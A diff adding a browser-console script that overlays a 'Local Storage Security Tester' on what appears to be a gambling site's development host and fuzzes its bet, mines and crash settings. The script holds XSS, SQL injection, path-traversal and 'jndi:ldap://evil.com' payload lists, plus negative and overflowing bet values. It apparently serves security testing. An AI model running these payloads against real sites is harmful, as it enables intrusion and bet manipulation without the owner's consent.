@@ -1,0 +1,562 @@
+// Security Tester Injection Script for Firefox Console - FIXED VERSION
+// Run this in the console while on https://dev.brickrax.com/
+
+(function() {
+    // Remove any existing tester
+    const existing = document.getElementById('security-tester-container');
+    if (existing) existing.remove();
+    
+    // Create container
+    const container = document.createElement('div');
+    container.id = 'security-tester-container';
+    container.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 999999;
+        background: rgba(0,0,0,0.95);
+        overflow: auto;
+    `;
+    
+    // Create iframe for isolation
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = `
+        width: 90%;
+        height: 90%;
+        margin: 5% auto;
+        display: block;
+        border: none;
+        border-radius: 8px;
+    `;
+    container.appendChild(iframe);
+    
+    // Add to page
+    document.body.appendChild(container);
+    
+    // Write the tester HTML - Using document.write to avoid template literal issues
+    iframe.contentDocument.open();
+    iframe.contentDocument.write(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local Storage Security Tester</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #1a1a1a;
+            color: #e0e0e0;
+        }
+        .close-button {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #f44336;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        .container {
+            background: #2a2a2a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        h1, h2 {
+            color: #4CAF50;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            background: #333;
+            border-radius: 5px;
+        }
+        .test-case {
+            margin: 10px 0;
+            padding: 10px;
+            background: #404040;
+            border-radius: 3px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .danger-button {
+            background: #f44336;
+        }
+        .danger-button:hover {
+            background: #da190b;
+        }
+        .log-entry {
+            margin: 5px 0;
+            padding: 8px;
+            background: #1a1a1a;
+            border-left: 3px solid #4CAF50;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .error-log {
+            border-left-color: #f44336;
+        }
+        .warning-log {
+            border-left-color: #ff9800;
+        }
+        input {
+            background: #404040;
+            color: #e0e0e0;
+            border: 1px solid #555;
+            padding: 8px;
+            border-radius: 3px;
+            margin: 0 5px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        #logs {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <button class="close-button" onclick="window.parent.document.getElementById('security-tester-container').remove()">✕ Close Tester</button>
+    
+    <h1>🔒 Local Storage Security Tester</h1>
+    
+    <div class="container">
+        <h2>Current Local Storage Values</h2>
+        <div id="current-values"></div>
+        <button onclick="refreshValues()">🔄 Refresh Values</button>
+        <button onclick="backupValues()">💾 Backup Current Values</button>
+        <button onclick="restoreValues()" class="danger-button">♻️ Restore Backup</button>
+    </div>
+
+    <div class="container">
+        <h2>Test Suites</h2>
+        <div class="grid">
+            <div class="test-section">
+                <h3>Bet Amount Tests</h3>
+                <button onclick="testBetAmounts()">Run Bet Tests</button>
+                <div class="test-case">
+                    <span>Negative values</span>
+                    <button onclick="setAndTest('last-bet-amount', -1000)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Zero value</span>
+                    <button onclick="setAndTest('last-bet-amount', 0)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Decimal values</span>
+                    <button onclick="setAndTest('last-bet-amount', 999.999)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Huge values</span>
+                    <button onclick="setAndTest('last-bet-amount', '999999999999999')">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>String injection</span>
+                    <button onclick="setAndTest('last-bet-amount', '1000_INJECTION_TEST')">Test</button>
+                </div>
+            </div>
+
+            <div class="test-section">
+                <h3>Mines Tests</h3>
+                <button onclick="testMinesValues()">Run Mines Tests</button>
+                <div class="test-case">
+                    <span>Invalid grid size</span>
+                    <button onclick="setAndTest('mines-grid-size', 1000)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Negative mines</span>
+                    <button onclick="setAndTest('mines-mine-count', -5)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>More mines than grid</span>
+                    <button onclick="testMinesOverflow()">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Non-numeric values</span>
+                    <button onclick="setAndTest('mines-grid-size', 'large')">Test</button>
+                </div>
+            </div>
+
+            <div class="test-section">
+                <h3>Crash Tests</h3>
+                <button onclick="testCrashValues()">Run Crash Tests</button>
+                <div class="test-case">
+                    <span>Target < 1</span>
+                    <button onclick="setAndTest('crash-target-multiplier', 0.5)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Infinite target</span>
+                    <button onclick="setAndTest('crash-target-multiplier', Infinity)">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>NaN values</span>
+                    <button onclick="setAndTest('crash-target-multiplier', 'NaN')">Test</button>
+                </div>
+            </div>
+
+            <div class="test-section">
+                <h3>Special Tests</h3>
+                <button onclick="testSpecialCases()">Run All Special Tests</button>
+                <div class="test-case">
+                    <span>SQL Injection</span>
+                    <button onclick="testSQLInjection()">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>XSS Payloads</span>
+                    <button onclick="testXSSPayloads()">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Type Confusion</span>
+                    <button onclick="testTypeConfusion()">Test</button>
+                </div>
+                <div class="test-case">
+                    <span>Buffer Overflow</span>
+                    <button onclick="testBufferOverflow()">Test</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>Custom Test</h2>
+        <div>
+            <input type="text" id="custom-key" placeholder="Key name" style="width: 200px;">
+            <input type="text" id="custom-value" placeholder="Test value" style="width: 300px;">
+            <button onclick="customTest()">Test Custom Value</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>Automated Fuzzing</h2>
+        <div>
+            <button onclick="startFuzzing()">🚀 Start Fuzzing (5 min)</button>
+            <button onclick="stopFuzzing()" class="danger-button">🛑 Stop Fuzzing</button>
+            <span id="fuzz-status"></span>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>Test Log</h2>
+        <button onclick="clearLogs()">Clear Logs</button>
+        <button onclick="exportLogs()">Export Logs</button>
+        <div id="logs"></div>
+    </div>
+</body>
+</html>
+    `);
+    
+    // Add the script separately to avoid escaping issues
+    const script = iframe.contentDocument.createElement('script');
+    script.textContent = `
+        // Access parent window's localStorage
+        const storage = window.parent.localStorage;
+        
+        let backup = {};
+        let fuzzingInterval = null;
+        let testCount = 0;
+
+        // Game-specific test values
+        const gameKeys = [
+            'last-bet-amount',
+            'limbo-bet-amount',
+            'mines-bet-amount',
+            'mines-grid-size',
+            'mines-mine-count',
+            'crash-bet-amount',
+            'crash-target-multiplier'
+        ];
+
+        const testPayloads = {
+            numeric: [
+                -1, 0, 0.001, 0.1, 1, 999999999, Infinity, -Infinity,
+                'NaN', null, undefined, '', ' ', '1e308', '1e-308'
+            ],
+            strings: [
+                '<img src=x onerror=alert(1)>',
+                '"><img src=x onerror=alert(1)>',
+                'javascript:alert(1)',
+                'onclick=alert(1)',
+                '../../../etc/passwd',
+                '1 OR 1=1',
+                "1'; DROP TABLE users--",
+                'jndi:ldap://evil.com',
+                '{{7*7}}',
+                '%00',
+                String.fromCharCode(0),
+                '\\x00'
+            ],
+            special: [
+                [], {}, true, false, new Date(), /regex/,
+                function(){}, BigInt(999999999999999999999n)
+            ]
+        };
+
+        function log(message, type = 'info') {
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            if (type === 'error') entry.className += ' error-log';
+            if (type === 'warning') entry.className += ' warning-log';
+            entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + message;
+            logs.insertBefore(entry, logs.firstChild);
+        }
+
+        function refreshValues() {
+            const container = document.getElementById('current-values');
+            container.innerHTML = '';
+            
+            gameKeys.forEach(key => {
+                const value = storage.getItem(key);
+                if (value !== null) {
+                    const div = document.createElement('div');
+                    div.className = 'test-case';
+                    div.innerHTML = '<strong>' + key + ':</strong> <code>' + value + '</code>';
+                    container.appendChild(div);
+                }
+            });
+            log('Values refreshed');
+        }
+
+        function backupValues() {
+            backup = {};
+            gameKeys.forEach(key => {
+                const value = storage.getItem(key);
+                if (value !== null) {
+                    backup[key] = value;
+                }
+            });
+            log('Backed up ' + Object.keys(backup).length + ' values', 'info');
+        }
+
+        function restoreValues() {
+            Object.entries(backup).forEach(([key, value]) => {
+                storage.setItem(key, value);
+            });
+            log('Values restored from backup', 'warning');
+            refreshValues();
+        }
+
+        function setAndTest(key, value) {
+            testCount++;
+            const original = storage.getItem(key);
+            
+            try {
+                storage.setItem(key, value);
+                log('Test #' + testCount + ': Set ' + key + ' = ' + JSON.stringify(value), 'info');
+                
+                // Check if value was accepted
+                const newValue = storage.getItem(key);
+                if (newValue != value) {
+                    log('Value changed: expected ' + value + ', got ' + newValue, 'warning');
+                }
+                
+                // Trigger any app logic by dispatching storage event on parent
+                window.parent.dispatchEvent(new StorageEvent('storage', {
+                    key: key,
+                    newValue: String(value),
+                    oldValue: original
+                }));
+                
+            } catch (e) {
+                log('Error setting ' + key + ': ' + e.message, 'error');
+            }
+        }
+
+        function testBetAmounts() {
+            const betKeys = ['last-bet-amount', 'limbo-bet-amount', 'mines-bet-amount', 'crash-bet-amount'];
+            const amounts = [-1000, -1, 0, 0.001, 0.99, 1, 100, 999999999999, '1e100', 'abc', null];
+            
+            betKeys.forEach(key => {
+                amounts.forEach(amount => {
+                    setAndTest(key, amount);
+                });
+            });
+        }
+
+        function testMinesValues() {
+            // Test grid sizes
+            [0, 1, 2, 5, 10, 20, 50, 100, -1, 'large', null].forEach(size => {
+                setAndTest('mines-grid-size', size);
+            });
+            
+            // Test mine counts
+            [0, -1, 100, 1000, 'all', null].forEach(count => {
+                setAndTest('mines-mine-count', count);
+            });
+        }
+
+        function testMinesOverflow() {
+            setAndTest('mines-grid-size', 5);
+            setAndTest('mines-mine-count', 30);
+            log('Testing mines overflow: 30 mines on 5x5 grid', 'warning');
+        }
+
+        function testCrashValues() {
+            const multipliers = [0, 0.5, 0.99, 1, 1.01, 2, 100, 1000, 999999, Infinity, -1, 'double'];
+            multipliers.forEach(mult => {
+                setAndTest('crash-target-multiplier', mult);
+            });
+        }
+
+        function testSQLInjection() {
+            const sqlPayloads = [
+                "1' OR '1'='1",
+                "1'; DROP TABLE bets;--",
+                "1 UNION SELECT * FROM users",
+                "admin'--",
+                "1' AND 1=1--"
+            ];
+            
+            gameKeys.forEach(key => {
+                sqlPayloads.forEach(payload => {
+                    setAndTest(key, payload);
+                });
+            });
+        }
+
+        function testXSSPayloads() {
+            const xssPayloads = [
+                '<img src=x onerror=alert(1)>',
+                '<svg onload=alert(1)>',
+                'javascript:alert(1)',
+                '<iframe src=javascript:alert(1)>',
+                '"><img src=x onerror=alert(1)>'
+            ];
+            
+            gameKeys.forEach(key => {
+                xssPayloads.forEach(payload => {
+                    setAndTest(key, payload);
+                });
+            });
+        }
+
+        function testTypeConfusion() {
+            gameKeys.forEach(key => {
+                testPayloads.special.forEach(payload => {
+                    try {
+                        setAndTest(key, payload);
+                    } catch (e) {
+                        log('Type confusion test failed for ' + key + ': ' + e.message, 'error');
+                    }
+                });
+            });
+        }
+
+        function testBufferOverflow() {
+            const sizes = [100, 1000, 10000, 100000, 1000000];
+            sizes.forEach(size => {
+                const bigString = 'A'.repeat(size);
+                gameKeys.forEach(key => {
+                    setAndTest(key, bigString);
+                    log('Testing ' + key + ' with ' + size + ' character string', 'info');
+                });
+            });
+        }
+
+        function testSpecialCases() {
+            testSQLInjection();
+            testXSSPayloads();
+            testTypeConfusion();
+            testBufferOverflow();
+        }
+
+        function customTest() {
+            const key = document.getElementById('custom-key').value;
+            const value = document.getElementById('custom-value').value;
+            if (key && value) {
+                setAndTest(key, value);
+            }
+        }
+
+        function getRandomPayload() {
+            const allPayloads = [
+                ...testPayloads.numeric,
+                ...testPayloads.strings,
+                ...testPayloads.special.filter(p => typeof p !== 'symbol')
+            ];
+            return allPayloads[Math.floor(Math.random() * allPayloads.length)];
+        }
+
+        function startFuzzing() {
+            if (fuzzingInterval) return;
+            
+            log('Starting fuzzing...', 'warning');
+            document.getElementById('fuzz-status').textContent = 'Fuzzing active...';
+            
+            fuzzingInterval = setInterval(() => {
+                const key = gameKeys[Math.floor(Math.random() * gameKeys.length)];
+                const value = getRandomPayload();
+                
+                try {
+                    setAndTest(key, value);
+                } catch (e) {
+                    log('Fuzzing error: ' + e.message, 'error');
+                }
+            }, 100);
+            
+            // Auto-stop after 5 minutes
+            setTimeout(stopFuzzing, 300000);
+        }
+
+        function stopFuzzing() {
+            if (fuzzingInterval) {
+                clearInterval(fuzzingInterval);
+                fuzzingInterval = null;
+                document.getElementById('fuzz-status').textContent = 'Fuzzing stopped';
+                log('Fuzzing stopped', 'warning');
+            }
+        }
+
+        function clearLogs() {
+            document.getElementById('logs').innerHTML = '';
+            testCount = 0;
+        }
+
+        function exportLogs() {
+            const logs = Array.from(document.querySelectorAll('.log-entry'))
+                .map(el => el.textContent)
+                .join('\\n');
+            
+            const blob = new Blob([logs], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'security-test-log-' + new Date().toISOString() + '.txt';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        // Initialize
+        refreshValues();
+        backupValues();
+    `;
+    iframe.contentDocument.body.appendChild(script);
+    iframe.contentDocument.close();
+    
+    console.log('Security Tester loaded! Click the X button to close.');
+})();
